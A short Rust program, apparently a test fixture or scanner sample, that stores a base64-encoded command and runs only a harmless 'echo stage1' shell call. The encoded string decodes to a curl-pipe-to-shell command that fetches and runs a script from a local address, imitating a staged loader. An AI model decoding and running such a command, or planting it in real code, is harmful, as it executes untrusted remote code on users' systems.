use std::process::Command;

fn main() {
    let encoded = "Y3VybCBodHRwOi8vMTI3LjAuMC4xL3NjcmlwdC5zaCB8IHNo";
    let _ = Command::new("sh").arg("-c").arg("echo stage1");
}
